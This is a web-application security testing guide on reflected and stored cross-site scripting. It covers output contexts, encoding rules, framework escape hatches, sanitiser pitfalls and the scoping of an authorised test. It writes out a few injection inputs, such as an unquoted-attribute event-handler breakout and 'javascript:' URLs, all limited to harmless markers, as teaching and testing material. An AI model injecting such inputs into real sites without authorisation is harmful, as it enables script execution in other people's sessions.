---
title: "Reflected and Stored XSS: Contexts, Encoding and Sanitisation"
date: 2026-11-15 22:00:00 +0000
subcategory: client-side
summary: "Finding and proving reflected and stored XSS with marker payloads: output contexts, sanitisers, framework escape hatches, blind XSS and fixes."
refs: [WSTG-INJT-01, WSTG-INJT-02, WSTG-CLNT-03, v5.0.0-1.2.1, v5.0.0-1.2.2, v5.0.0-1.2.3, v5.0.0-1.3.1, v5.0.0-1.3.4, v5.0.0-1.3.5, v5.0.0-3.2.1, v5.0.0-3.2.2, v5.0.0-3.4.3, v5.0.0-3.4.4, "A05:2025", CWE-79, CWE-80, CWE-83, CWE-84, CWE-87, CWE-116]
tags: [web, xss, client-side, output-encoding, html-sanitization, secure-coding]
---

This note is part of our [Web Application Security testing guide](/web/web-application-security-testing-guide/) and sits under [Client-Side](/web/web-client-side-testing-guide/). It covers cross-site scripting (XSS) where the server puts attacker-controlled data into a page: **reflected** XSS, where the data comes from the current request (`WSTG-INJT-01`), **stored** XSS, where it was saved earlier and rendered later, possibly to someone else (`WSTG-INJT-02`), and **HTML injection**, where markup gets in but script may not (`WSTG-CLNT-03`). The root cause is always the same. Data crosses into a browser parser (HTML, attribute, URL, JavaScript, CSS or SVG) without the encoding or sanitisation that parser needs, so the browser runs it as code instead of showing it as text. Modern frameworks escape by default, and the bugs that remain sit where the default stops: an `href` that accepts any scheme, a value dropped into an inline script, a rich-text field, a Markdown renderer that allows HTML, an SVG upload served inline, a `dangerouslySetInnerHTML` or `|safe` someone added under deadline, or an admin screen that renders a support ticket nobody thought of as user input. You get the model (contexts and why the encoding has to match the context), the variants that still produce findings, twelve tests that prove execution with harmless markers only (`alert(document.domain)`, `print()`, a `console.log` line or visible `GT-XSS-<id>` text), the rules for stored and blind payloads, and fixes for Express, React, Angular, Vue, Django, Jinja2, Spring/Thymeleaf, Laravel Blade and Rails, with sanitiser configuration and regression tests. DOM-based XSS, where the whole flow from source to sink happens in client-side JavaScript, and Trusted Types are covered in [DOM XSS and client-side injection](/web/web-dom-xss-client-side-injection/). Content Security Policy and the other browser headers have their own note, [CSP and security headers](/web/web-content-security-policy-headers/). Scriptless injection (dangling markup, CSS exfiltration) is covered in [DOM clobbering and CSS injection](/web/web-dom-clobbering-css-injection/).

## Contents

- [How it works](#how-it-works)
  - [What XSS is and why the browser cannot tell](#what-xss-is-and-why-the-browser-cannot-tell)
  - [Reflected, stored, blind and DOM-based](#reflected-stored-blind-and-dom-based)
  - [Output contexts and why encoding must match](#output-contexts-and-why-encoding-must-match)
  - [Nested contexts and decoding order](#nested-contexts-and-decoding-order)
  - [Where frameworks escape for you and where they stop](#where-frameworks-escape-for-you-and-where-they-stop)
- [What goes wrong](#what-goes-wrong)
  - [Missing or wrong-context encoding](#missing-or-wrong-context-encoding)
  - [Unquoted attributes and event handlers](#unquoted-attributes-and-event-handlers)
  - [URLs that accept any scheme](#urls-that-accept-any-scheme)
  - [Data in script blocks and JSON-in-script](#data-in-script-blocks-and-json-in-script)
  - [Framework escape hatches](#framework-escape-hatches)
  - [Rich text, Markdown and sanitiser configuration](#rich-text-markdown-and-sanitiser-configuration)
  - [Mutation XSS](#mutation-xss)
  - [Stored inputs nobody thinks of](#stored-inputs-nobody-thinks-of)
  - [Second-order rendering in admin and back-office tools](#second-order-rendering-in-admin-and-back-office-tools)
  - [Uploaded files and content types](#uploaded-files-and-content-types)
  - [Error pages, 404s and debug output](#error-pages-404s-and-debug-output)
  - [HTML injection without script](#html-injection-without-script)
  - [Self-XSS and when it matters](#self-xss-and-when-it-matters)
- [Testing](#testing)
  - [Before you start](#before-you-start)
  - [Signals and false positives](#signals-and-false-positives)
  - [GT-WEB-XSS-1: Map reflection and storage points with a unique canary](#gt-web-xss-1-map-reflection-and-storage-points-with-a-unique-canary)
  - [GT-WEB-XSS-2: Probe special characters and identify the context](#gt-web-xss-2-probe-special-characters-and-identify-the-context)
  - [GT-WEB-XSS-3: HTML body context, HTML injection and error pages](#gt-web-xss-3-html-body-context-html-injection-and-error-pages)
  - [GT-WEB-XSS-4: Quoted and unquoted attribute contexts](#gt-web-xss-4-quoted-and-unquoted-attribute-contexts)
  - [GT-WEB-XSS-5: URL contexts and dangerous schemes](#gt-web-xss-5-url-contexts-and-dangerous-schemes)
  - [GT-WEB-XSS-6: JavaScript string, template literal and JSON-in-script contexts](#gt-web-xss-6-javascript-string-template-literal-and-json-in-script-contexts)
  - [GT-WEB-XSS-7: CSS, SVG and XML contexts](#gt-web-xss-7-css-svg-and-xml-contexts)
  - [GT-WEB-XSS-8: Stored XSS across write and render paths](#gt-web-xss-8-stored-xss-across-write-and-render-paths)
  - [GT-WEB-XSS-9: Blind XSS in back-office tools](#gt-web-xss-9-blind-xss-in-back-office-tools)
  - [GT-WEB-XSS-10: Rich text, Markdown and sanitiser review](#gt-web-xss-10-rich-text-markdown-and-sanitiser-review)
  - [GT-WEB-XSS-11: Uploaded files, Content-Type and nosniff](#gt-web-xss-11-uploaded-files-content-type-and-nosniff)
  - [GT-WEB-XSS-12: Framework escape-hatch and template review](#gt-web-xss-12-framework-escape-hatch-and-template-review)
- [Secure implementation](#secure-implementation)
  - [Design rules](#design-rules)
  - [Node.js and Express templates](#nodejs-and-express-templates)
  - [React](#react)
  - [Angular and Vue](#angular-and-vue)
  - [Django](#django)
  - [Jinja2 and Flask](#jinja2-and-flask)
  - [Spring and Thymeleaf](#spring-and-thymeleaf)
  - [Laravel Blade](#laravel-blade)
  - [Rails](#rails)
  - [Sanitising rich text](#sanitising-rich-text)
  - [URL scheme allow-lists](#url-scheme-allow-lists)
  - [Content-Type, nosniff and downloads](#content-type-nosniff-and-downloads)
  - [CSP and Trusted Types as defence in depth](#csp-and-trusted-types-as-defence-in-depth)
  - [Regression tests](#regression-tests)
- [Practice labs](#practice-labs)
- [Real-world cases](#real-world-cases)
- [Rating findings](#rating-findings)
- [Mapping](#mapping)
- [References](#references)

## How it works

### What XSS is and why the browser cannot tell

A web page is a program the server writes and the browser runs. When the server builds that page from a template and fills in a value (a search term, a display name, a comment), the browser receives one stream of text. It has no way to know which bytes came from the developer and which from a user. If the value contains characters that mean something to the parser at that position, such as `<` in HTML text, `"` in a quoted attribute or `'` in a JavaScript string, the value stops being data and becomes part of the page's structure.

The consequence is that script runs **in the origin of the vulnerable site**. The same-origin policy, which normally keeps one site away from another site's data, now works for the attacker. The injected script can read what the page can read, call the site's APIs with the victim's cookies, read CSRF tokens, change the page the victim sees, and act as the victim until the tab closes. `HttpOnly` cookies stop script reading the session cookie itself, but not using it: requests sent from the injected script carry the cookie automatically. That is why the OWASP XSS Prevention Cheat Sheet describes cookie attributes as limiting impact rather than preventing XSS, and why this note never needs to touch a cookie to prove a finding. If the page can do it, the script can do it.

CWE files the weakness as CWE-79, *Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')*, a Base-level entry that MITRE allows for mapping. In the OWASP Top 10:2025 XSS sits under **A05:2025 Injection**. The 2025 page describes it as the high-frequency, low-impact part of the category, with more than 30,000 CVEs mapped to CWE-79. "Low impact" is an average across all those CVEs. A single stored XSS that fires in an administrator's browser is often the most serious finding of a test.

### Reflected, stored, blind and DOM-based

| Type | Where the payload lives | Who gets hit | How it is delivered | Covered in |
|---|---|---|---|---|
| **Reflected** (non-persistent, type 1) | In the current request: query string, path, form field, header | Whoever sends the request | A link, a cross-site form post, a redirect | This note (`WSTG-INJT-01`) |
| **Stored** (persistent, type 2) | In the application's data: database, files, logs, caches, search index | Everyone who views the object | The attacker saves it once; victims only browse | This note (`WSTG-INJT-02`) |
| **Blind** (a kind of stored XSS) | In data shown in a tool the tester cannot see (support desk, admin panel, log viewer) | Staff using the back-office tool | Same as stored; it fires later, elsewhere | This note, [GT-WEB-XSS-9](#gt-web-xss-9-blind-xss-in-back-office-tools) |
| **DOM-based** (type 0) | Client-side JavaScript reads a source (`location`, `postMessage`, storage) and writes it to a sink | Whoever loads the crafted URL or state | Usually a link | [DOM XSS and client-side injection](/web/web-dom-xss-client-side-injection/) |
| **Self-XSS** | Only in input the victim types into their own session | The victim, if tricked into pasting | Social engineering; sometimes a chain | [Self-XSS and when it matters](#self-xss-and-when-it-matters) |

The lines blur in modern applications. A single-page app may fetch a stored comment over JSON and write it with `innerHTML`: the data is stored, the sink is in the DOM. Test the server-rendered paths here and the client-rendered ones with the DOM note's methods. Whichever path you find it on, the finding is still XSS.

### Output contexts and why encoding must match

The **context** is the parser state at the point where the value lands. Each context has its own special characters and its own way of being escaped. PortSwigger's contexts page puts the testing task this way: find where the data appears in the response and what processing is applied to it, then pick payloads for that context. The developer's task is the mirror image: use the encoder for that context. ASVS 5.0 requires it in three L1 requirements: `v5.0.0-1.2.1` (encoding relevant to the HTML element, attribute, comment, CSS or header context), `v5.0.0-1.2.2` (URL encoding for dynamically built URLs, and only safe URL schemes) and `v5.0.0-1.2.3` (encoding when building JavaScript and JSON).

| Context | Example template | What breaks out | Correct handling |
|---|---|---|---|
| HTML body (between tags) | `<p>Hello, VALUE</p>` | `<` starts a new tag | HTML entity encoding of `& < > " '` (framework auto-escaping) |
| Quoted attribute | `<input value="VALUE">` | The matching quote ends the value; then new attributes | Attribute encoding, always quote the attribute |
| Unquoted attribute | `<input value=VALUE>` | A space ends the value; then `onfocus=…` | Never leave attributes unquoted; entity encoding alone does not help |
| Event-handler attribute | `<button onclick="go('VALUE')">` | HTML decodes entities *first*, then JavaScript parses the result | Do not build handlers from data; use `addEventListener` and data attributes |
| URL attribute (`href`, `src`, `action`, `formaction`) | `<a href="VALUE">` | No breakout needed: `javascript:` runs on click | Validate the scheme (allow-list `https:`, `mailto:`…), then attribute-encode |
| URL component | `<a href="/search?q=VALUE">` | `&` and `#` change the URL; quotes break the attribute | Percent-encode the component, then attribute-encode |
| JavaScript string in `<script>` | `var q = 'VALUE';` | `'` ends the string; `</script>` ends the whole block regardless of quotes | A JavaScript-string encoder that also handles `<` and `/`; better, no data in scripts |
| JavaScript template literal | ``var q = `VALUE`;`` | `` ` `` and `${` | Same; avoid |
| JSON inside `<script>` | `var cfg = {"q": "VALUE"};` | `</script>` ends the block even inside a valid JSON string | Serialise to JSON and escape `<`, `>`, `&` as `<` etc., or use a JSON data block read with `JSON.parse` |
| CSS (`<style>` or `style=""`) | `color: VALUE;` | `;` adds declarations, `}` closes the rule, `</style>` closes the block; `url()` loads resources | Do not put data in CSS; allow-list values for the property |
| SVG and XML | `<text>VALUE</text>` in an SVG served as `image/svg+xml` | SVG is a scriptable document: `<script>`, event handlers, `<foreignObject>` | XML-encode values; sanitise uploaded SVG (`v5.0.0-1.3.4`) or never serve it inline |
| HTML comment | `<!-- VALUE -->` | `-->` | Never put data in comments |
| Raw-text elements (`<title>`, `<textarea>`) | `<textarea>VALUE</textarea>` | Only the matching end tag | Entity encoding still works and is the default |

Two rules follow from the table. First, **encoding is chosen by the destination, not by the source**: the same display name needs HTML encoding in a heading, JavaScript-string encoding in an inline script and URL encoding in a link. A value "sanitised on input" for one of these is wrong for the others. Second, **some places have no safe encoding**: the OWASP cheat sheet calls them dangerous contexts (directly inside a script, inside a comment, inside CSS, as an attribute or tag name, an entire event-handler value, and code-evaluating functions such as `eval()` or `setTimeout()` with a string). The fix there is design, not escaping.

### Nested contexts and decoding order

Contexts nest, and the browser decodes the outer one before it parses the inner one. An `onclick` value is first an HTML attribute (the HTML parser turns `&#39;` back into `'`) and only then JavaScript. So HTML-encoding a value inside a JavaScript string in an event handler does not protect it: by the time the JavaScript parser sees it, the quote is a quote again. PortSwigger's lab *Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped* is built around exactly this. The cheat sheet's "common mistake" goes the other way round: a URL in an `href` needs URL encoding of the component *and then* attribute encoding of the whole attribute value.

The parser order also explains the most surprising JavaScript-context result: a value inside a perfectly escaped JavaScript string can still close the script block with `</script>`. The HTML tokenizer finds the end tag before the JavaScript engine ever sees the string. A JavaScript-string encoder therefore has to escape `<` (or `/`) as well as quotes and backslashes, and `JSON.stringify` on its own is not enough.

### Where frameworks escape for you and where they stop

Template engines escape by default for the HTML body and quoted attributes. That default covers most output, and the bugs live in the rest:

| Framework | Escaped by default | Raw output (escape hatch) | Not covered by the default |
|---|---|---|---|
| React (JSX) | Text children and attribute values | `dangerouslySetInnerHTML` | `javascript:` URLs before React 19 (16.9 to 18 only warn); `data:` and other schemes; anything you write to the DOM outside React |
| Angular | Interpolation; `[innerHTML]` is sanitised | `DomSanitizer.bypassSecurityTrustHtml`, `…Script`, `…Style`, `…Url`, `…ResourceUrl` | Values marked trusted; direct DOM access through `ElementRef` |
| Vue | Text interpolation and bound attributes | `v-html`, `innerHTML` in render functions | URL schemes in bound `href` (Vue's guide says to sanitise URLs on the back end) |
| Django templates | All variables (`autoescape` on) | The `safe` filter, `mark_safe()`, the `autoescape` block tag switched off, filters registered with `is_safe=True` | Unquoted attributes, JavaScript and CSS contexts (use `json_script`) |
| Jinja2 | Only when `autoescape` is enabled; Flask enables it for `.html`, `.htm`, `.xml`, `.xhtml`, `.svg` | The `safe` filter, `Markup()`, the `autoescape` block tag set to false | Templates rendered by a bare `Environment()` with no autoescape setting |
| Thymeleaf | `th:text`, `th:value` and attribute processors; `[[…]]` in `th:inline="javascript"` JS-escapes | `th:utext`, `[(…)]` | Schemes of user-supplied URLs (restricted expression mode limits what URL expressions may access, not the scheme); hand-written `on*` attributes (`th:on*` in 3.1 accepts only numeric or boolean variable values) |
| Laravel Blade | The double-curly-brace echo (passed through `htmlspecialchars`) | The unescaped echo: one curly brace and two exclamation marks on each side | Inline scripts (use `Js::from`), URL schemes |
| Rails (ERB) | `<%= %>` | `raw`, `html_safe`, `<%==` | URL schemes; `html_safe` on concatenated strings |
| Express + EJS / Pug / Handlebars | EJS `<%= %>`, Pug `#{}` and `=`, Handlebars double braces | EJS `<%- %>`, Pug `!{}` and `!=`, Handlebars triple braces | Express itself does not escape; `res.send` with a built string bypasses all of it |


## What goes wrong

### Missing or wrong-context encoding

**What happens:** a page is built by string concatenation (`res.send("<h1>Results for " + q + "</h1>")`, `echo "Hello $name"`, `HttpServletResponse.getWriter().print(...)`), or a template engine with auto-escaping is used in a context it does not cover, or a value is escaped once for HTML and then reused inside a script or URL.

**Why it matters:** it is the textbook reflected XSS and still the most common one in code paths that grew outside the main framework: legacy pages, error handlers, PDF and email templates rendered in a browser, admin tools, "quick" endpoints that return HTML fragments for an AJAX call.

**Where to look:** search results pages, "you searched for", form re-display after validation errors, "back" and "return" URL parameters, pagination links, endpoints that return HTML fragments (`text/html` responses to `X-Requested-With` requests), and anything that renders without the main layout.

### Unquoted attributes and event handlers

**What happens:** a template writes `class=VALUE` or `value=VALUE` without quotes, or builds an inline handler such as `onclick="select('VALUE')"`.

**Why it matters:** an unquoted attribute ends at the first space, so `x onmouseover=print()` adds a new attribute with no angle brackets or quotes at all. Django's security documentation uses exactly this example (a `class` attribute filled from a variable without quotes) to show where auto-escaping stops helping. Event handlers are worse: they nest JavaScript inside HTML, and HTML entities are decoded before the script runs, so HTML-encoding the value does nothing for the JavaScript context. This is the classic home of CWE-83 (*Improper Neutralization of Script in Attributes in a Web Page*).

**Where to look:** hand-written templates, legacy JSP and PHP, server-generated `onclick` and `onchange` handlers in data tables, `style` attributes built from user preferences.

### URLs that accept any scheme

**What happens:** a user-supplied URL (profile website, "return to" link, avatar URL, link in a comment, a link field in a CMS) is put into `href`, `src`, `action`, `formaction` or an `iframe` without checking the scheme. Encoding is applied, so no quote breaks out, but none is needed: `javascript:print()` in an `href` runs when the victim clicks.

**Why it matters:** this survives every auto-escaping template engine, because the value is a perfectly well-formed attribute. React 16.9 started warning about `javascript:` URLs, and current React (19) replaces them with a URL that throws when followed (the OWASP cheat sheet notes that this still does not replace your own URL validation). Older React versions, Vue, Angular templates bound to things marked trusted, and every server-side template still render them. The Steam chat case in [Real-world cases](#real-world-cases) was a `javascript:` URL in a React client.

**Where to look:** every user-controllable link and redirect target. `data:` and `vbscript:` deserve a look too; browsers block top-level navigation to `data:` URLs, but `data:` in `iframe src` or `object data` still renders. Scheme filters fail on case, leading spaces and control characters, and on embedded tabs and newlines (the URL parser strips them, a naive regex does not). React's own check strips exactly those before testing for `javascript:`, which is a good model for yours. ASVS `v5.0.0-1.2.2` (L1) asks for safe protocols only.

### Data in script blocks and JSON-in-script

**What happens:** server data is passed to client code by writing it into an inline script: `var user = '<%= name %>';` or `window.__STATE__ = <%- JSON.stringify(state) %>;`. Hydration payloads of server-rendered single-page apps, analytics snippets and "config" blocks are the usual places.

**Why it matters:** quote-escaping is necessary but not sufficient. `</script>` closes the block from inside a string; a backslash the application does not escape cancels the backslash it adds before a quote (PortSwigger's lab *Reflected XSS into a JavaScript string with single quote and backslash escaped* turns on this); template literals interpolate `${…}`. `JSON.stringify` produces valid JSON, not HTML-safe JSON, so a state object that contains a user's bio with `</script>` in it breaks out of the block.

**Where to look:** view the page source (not the DOM inspector) of every server-rendered page and search for your canary inside `<script>` elements, including `type="application/json"` blocks, `data-` attributes holding JSON, and `__NEXT_DATA__`-style hydration blocks.

### Framework escape hatches

**What happens:** a developer needs to render HTML (a formatted description from the CMS, highlighted search terms, an email preview, an embed code) and reaches for the framework's raw-output feature: `dangerouslySetInnerHTML`, Angular's `bypassSecurityTrustHtml`, Vue's `v-html`, Django's `mark_safe` or the `safe` filter, Jinja2's `Markup` or `safe`, Thymeleaf's `th:utext`, Blade's unescaped echo, Rails' `raw` and `html_safe`, EJS `<%- %>`, Handlebars triple braces.

**Why it matters:** each of these is the framework saying "you take responsibility now". They are fine when the value is a constant or has just been through a real sanitiser; they are XSS when the value is user data. Rails' own guide stresses that `html_safe` performs no escaping at all; it is an assertion. Angular's documentation is equally blunt: values passed through `bypassSecurityTrust…` are not sanitised. The search for these is the cheapest grey-box test there is (see [GT-WEB-XSS-12](#gt-web-xss-12-framework-escape-hatch-and-template-review)).

**Where to look:** grep the code base, and in a black-box test look for features that display formatted text: descriptions, bios, signatures, release notes, email templates, "custom HTML" widgets, highlighted search snippets.

### Rich text, Markdown and sanitiser configuration

**What happens:** the application lets users author formatting (a WYSIWYG editor, Markdown, BBCode) and stores and renders HTML. It is protected by a sanitiser, a home-made regex or nothing. Typical problems:

- **A home-made filter.** A deny-list (strip `<script>`, strip `on*=`) misses tags and attributes it does not list, and a single-pass removal leaves a working tag behind once the inner match is gone (WSTG-INJT-01's non-recursive filtering example). These are findings about the filter; this note does not reproduce bypass lists, the [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) has them.
- **A good sanitiser, configured permissively.** Allowing `style`, `script`, `iframe`, `svg`, `math`, `form` or any `on*` attribute, or every tag (`allowedTags: false` in sanitize-html), or URL attributes without a scheme allow-list. sanitize-html's README says plainly that allowing `script` or `style` leaves you open to XSS, and it logs a warning unless `allowVulnerableTags` silences it.
- **A good sanitiser, used in the wrong order.** Sanitising and then modifying the HTML (inserting mentions, rewriting links, running a template engine over it) or passing it to a library that changes it. The OWASP cheat sheet warns that this voids the sanitisation.
- **An outdated or abandoned sanitiser.** Bypasses keep being found and fixed: DOMPurify's GitHub security page lists a run of advisories through 2026, many tied to options such as `SAFE_FOR_TEMPLATES`, `IN_PLACE` or `PARSER_MEDIA_TYPE`. Mozilla's **bleach** for Python was deprecated in January 2023 because it depends on html5lib, which is no longer actively developed, and its README now states that it is no longer maintained and will receive no further releases, including for security issues. **nh3** (Python bindings for the Rust **ammonia** sanitiser) is the usual replacement.
- **Markdown that allows HTML.** Markdown passes raw HTML through by design. `marked` states that it does not sanitise its output and recommends DOMPurify on the result. `markdown-it` disables HTML by default and blocks `javascript:`, `vbscript:`, `file:` and most `data:` links, so a `markdown-it` finding usually means someone turned `html: true` on. Plugins (diagrams, embeds, math) generate HTML after the core parser and are a frequent source of bypasses: the GitLab Mermaid case in [Real-world cases](#real-world-cases) is one. ASVS `v5.0.0-1.3.5` (L2) asks for Markdown, BBCode, CSS and similar scriptable content to be sanitised or disabled; `v5.0.0-1.3.1` (L1) asks for WYSIWYG HTML to go through a well-known sanitiser.

**Where to look:** comment boxes and descriptions with a formatting toolbar, wiki pages, ticket bodies, chat messages, email templates editable by tenants, "about me" fields, the README renderer of anything that hosts files.

### Mutation XSS

Mutation XSS (mXSS) is what happens when sanitised HTML changes meaning after the sanitiser has finished with it. A sanitiser parses the input into a DOM tree, removes what is dangerous and serialises the tree back to a string. The page then assigns that string to `innerHTML`, so the browser parses it again. HTML parsing is not idempotent: serialising a tree and parsing the result can give a *different* tree, especially around foreign content (SVG and MathML), `noscript`, `template`, raw-text elements, comments and mis-nested forms. A tree that was harmless when the sanitiser inspected it becomes one with a live event handler after the second parse.

The best-known public example is Michał Bentkowski's DOMPurify bypass from September 2020 (CVE-2020-26870, fixed in 2.0.17): nested `form` elements and a MathML namespace switch made the re-parsed tree differ from the sanitised one. Gareth Heyes broke the patched version weeks later with a related technique, and DOMPurify has fixed further mXSS issues since then (CVE-2024-47875, nesting-based mXSS, fixed in 2.5.0 and 3.1.3; CVE-2025-26791, an incorrect template-literal regex under `SAFE_FOR_TEMPLATES`, fixed in 3.2.4). Python's bleach had its own (CVE-2021-23980, only with a non-default combination of allowed tags and `strip_comments=False`).

What this means for testing: you do not need to invent mXSS payloads. Check **which sanitiser, which version and which configuration**, and whether anything modifies or re-parses the output between the sanitiser and the sink. A version with a published mXSS fix, or a configuration listed in an advisory, is a finding you can report from the version alone, rated by whether the vulnerable path is reachable.

### Stored inputs nobody thinks of

WSTG-INJT-02 lists profile fields, carts, file managers, settings, forums, blogs and logs, and notes that URL paths, cookies and headers count too. In practice the stored inputs that produce findings are the ones nobody treated as user content:

| Source | Why it gets missed |
|---|---|
| Display names, usernames, company and team names | Validated for length, not content; rendered in dozens of places (headers, mentions, notifications, audit logs, invoices) |
| File names of uploads | The file is scanned, the name is not; shown in lists, download links and admin views |
| Comments, reviews, ticket bodies, chat | The obvious one, often handled; but previews, notifications and email digests use a different template |
| Markdown, rich text, signatures, bios | Sanitiser configuration differs per field |
| Support tickets and contact forms | Rendered in a third-party or internal help-desk tool you never see |
| Email-to-ticket and email-to-comment gateways | Subject, sender name and HTML body arrive by SMTP, bypassing the web form's validation |
| CSV, Excel, vCard, ICS or JSON imports | Bulk import code skips the per-field checks of the UI |
| PDF and document metadata (title, author) | Extracted and displayed in a document list |
| HTTP headers stored by the application | `User-Agent`, `Referer` and `X-Forwarded-For` shown in "active sessions", audit logs and analytics dashboards |
| Integration names, webhook URLs, OAuth client names | Shown to other users on consent and settings screens |
| Data from third-party APIs | Product feeds, social profiles, payment descriptors, treated as trusted because they came from a partner |

### Second-order rendering in admin and back-office tools

A value can be stored safely and rendered safely in the customer-facing app, and still execute in a different application that reads the same database: the admin panel, the support desk, a CRM, a log viewer, a fraud-review console, an analytics dashboard. These tools are often older, built by a different team, and assume their data is trusted because "only staff see it". WSTG-INJT-02 stresses testing every admin-visible area for user-submitted data, and CWE-79's own description names injecting into a log message that an administrator later views as an example of stored XSS.

The impact is usually the highest of any XSS: the script runs in a staff session with access to every customer, often without MFA re-prompts and inside the corporate network. The testing is also the riskiest, because the payload fires in a real person's browser. That is why [blind XSS](#gt-web-xss-9-blind-xss-in-back-office-tools) needs written approval and a callback that reports nothing but the fact that it fired.

### Uploaded files and content types

**What happens:** the application lets users upload files and serves them back from its own origin. An HTML file, or an SVG (which is an XML document that can contain script and event handlers), is served with `Content-Type: text/html` or `image/svg+xml` and `Content-Disposition: inline`, so opening its URL renders it as a page on `app.example.com`. Variants: the server trusts the client's `Content-Type` on upload and echoes it on download; it serves files without a `Content-Type` and the browser sniffs HTML; an SVG renamed to `.png` is still served as SVG (the GitLab wiki case in [Real-world cases](#real-world-cases)); API responses carrying user data are sent as `text/html`.

**Why it matters:** the uploaded file runs with the full privileges of the application origin. `X-Content-Type-Options: nosniff` (ASVS `v5.0.0-3.4.4`, L2) stops the browser guessing HTML from content, so a `text/plain` file stays text. `Content-Disposition: attachment` makes the browser download instead of render, and ASVS `v5.0.0-3.2.1` (L1) lists it, a CSP `sandbox` directive and `Sec-Fetch-*` checks as ways to stop content being rendered in the wrong context. Serving user files from a separate registrable domain removes the origin problem altogether. SVG uploads that must render inline need SVG sanitisation (`v5.0.0-1.3.4`, L2). Upload validation in depth (extensions, magic bytes, storage location, server-side execution, archive handling) belongs to the Server-Side Request & Files subcategory, which is not written yet; this note only covers the rendering side.

**Where to look:** avatars, attachments, import files, "export to HTML", document previews, and any endpoint that returns stored content with a `Content-Type` derived from the file name or the upload request.

### Error pages, 404s and debug output

**What happens:** the not-found page says "The page /whatever could not be found", the 500 page echoes the failing parameter, a validation message repeats the input, a debug toolbar or framework error page prints request data. These are often rendered by a different code path (the web server, a CDN or load balancer error template, a catch-all exception handler) than the rest of the app, without its template engine.

**Why it matters:** the path is the easiest reflected input to deliver; a link is enough. Crawlers and some scanner configurations concentrate on parameters of pages that exist and pay less attention to the path of a 404. Framework debug pages left enabled in production add verbose errors on top (reported separately).

**Where to look:** request a nonexistent path containing your canary, send malformed values to typed parameters (letters where a number is expected), break the CSRF token, use an unsupported method, and send oversized or badly encoded input to trigger 400 and 500 responses. Check every error response for your canary.

### HTML injection without script

Sometimes markup gets in but script does not: a strict CSP blocks inline script, a sanitiser removes handlers but keeps `form`, `a`, `img`, `meta` or `base`, or the injection point only allows a few characters. WSTG-CLNT-03 treats this as its own test, and it is a finding in its own right: an attacker can add a fake login form or a "your session expired" message on the real domain, point links elsewhere, or use [dangling markup](/web/web-dom-clobbering-css-injection/) to capture part of the page that follows the injection point. GitLab's report in [Real-world cases](#real-world-cases) is a good illustration: an earlier fix removed the script vector but left the HTML injection, which the reporter then turned into a full stored XSS. Report HTML injection even when you cannot make script run, and say what stops execution.

### Self-XSS and when it matters

Self-XSS is script execution that only the victim can trigger, by typing or pasting the payload into their own session: a field only they can see, or a request that cannot be forged cross-site (a JSON `PUT` with a custom header and a CSRF token). PortSwigger describes it as needing social engineering, so on its own it is usually informational, and many bug bounty programmes exclude it.

It matters when something else lets an attacker put the payload into the victim's session or view:

- **CSRF on the field that stores it.** If the attacker can submit the profile update cross-site, the self-XSS becomes stored XSS in the victim's account.
- **Login CSRF.** The attacker logs the victim into the *attacker's* account (where the payload sits), and the script runs on the shared origin. What it can reach then depends on the session design (for example, whether the victim's real session can be restored or is still open in another tab); show the chain before you rate it up.
- **The value is visible to someone else after all.** A "private" field shown to admins, tenant owners or in an export is ordinary stored XSS.
- **Clickjacking or drag-and-drop** of the payload into a framed field.
- **Cookie or storage injection from a sibling subdomain.** Covered in the Session Management notes (not yet published) and [browser storage](/web/web-browser-storage-third-party-scripts/).

Report self-XSS as Info or Low with a note on what would turn it into a real issue, and as a full finding when you can show the chain against your own two accounts.

## Testing

Everything below assumes an **authorised** engagement with written scope and rules of engagement, a bug bounty programme whose rules allow XSS testing (including stored payloads, if you plan to place any), or a deliberately vulnerable lab. Requests and responses in this note are **illustrative**: hosts are fictional and outputs are shortened.

### Before you start

**Confirm the scope in writing.** XSS testing leaves data behind and can run code in other people's browsers, so agree these points before the first probe:

| Item | What to agree |
|---|---|
| Targets | Hosts and paths in scope, including the admin and back-office applications that render customer data, and whether a staging copy with production-like templates exists (prefer it for stored tests) |
| Proof level | Our default: harmless markers only (`alert(document.domain)`, `print()`, a `console.log` line or visible `GT-XSS-<id>` text). No payload reads or sends cookies, tokens, storage, page content or keystrokes, loads a remote framework, propagates itself or performs actions as the victim |
| Stored payloads | Only in objects that only your own test accounts can see, or in staging. Anything that other users or real staff would render (public comments, shared workspaces, support tickets, admin views) needs explicit written approval per location |
| Blind XSS | Not by default. Only with written approval naming the back-office tools, and a callback that reports only that the payload fired and the page origin and path |
| Automation | Whether Burp Scanner or other active scanners may run, on which hosts, and at what rate; scanners submit forms and can store hundreds of payloads |
| Windows and contacts | Testing hours, an emergency contact, and how to report a stored XSS in an admin tool immediately |
| Background | Front-end and template frameworks, sanitiser libraries and versions, CSP in force, and whether you get source code; a grey-box test with source finds escape hatches in minutes |

**Accounts.** At least two ordinary users you control (user A plants, user B views), a higher role if the client provides one (an admin or support agent account is how you see second-order rendering without needing blind XSS), and a second tenant for multi-tenant products. Use a separate browser profile per account so a payload that fires cannot touch your other sessions.

**Proxy.** One Burp project per engagement with the target scope set and Logger on. Tools you will use:

- **Repeater** for probes, and the raw response view rather than the rendered one.
- **Burp's search** (it searches requests and responses across Proxy history and the other tools) to find every response that contains a canary, including responses to *other* requests: that is how stored reflections show up.
- **Param Miner** ("Guess params" and "Guess headers") for unlinked parameters that are reflected. It can guess thousands of names per request, so restrict it to chosen endpoints and keep its thread pool small.
- **Reflected Parameters** (BApp, Burp Suite Professional) flags request values that appear in responses as you browse.
- **Hackvertor** for encodings (URL, HTML entities, JavaScript escapes) when a value passes through several layers.
- **DOM Invader** (in Burp's browser) when a reflection ends up in client-side code; that path continues in [DOM XSS and client-side injection](/web/web-dom-xss-client-side-injection/).
- **Burp Scanner** only if agreed, with a resource pool of one concurrent request and a delay, scoped to requests you choose. OWASP ZAP's active scanner is the open-source alternative, with the same caveats.

**Marker payloads.** Every payload in this note proves execution and nothing else. Use `alert(document.domain)` (it shows *which origin* the script runs in, which matters for sandbox domains), `print()` where dialogs are blocked (PortSwigger notes that Chrome 92 and later stop cross-origin iframes calling `alert()`), or `console.log('GT-XSS-<id>')` when you want no dialog at all. Give each payload a unique ID, such as `GT-XSS-014`, and put the ID in the payload itself, so that a dialog seen weeks later can be traced to one request, one field and one tester.

**Stored-payload register.** Record every stored probe at the moment you place it, including canaries and plain-HTML markers, not only script payloads:

| ID | Account | Object and field | Where it renders | Payload | Placed | Removed |
|---|---|---|---|---|---|---|
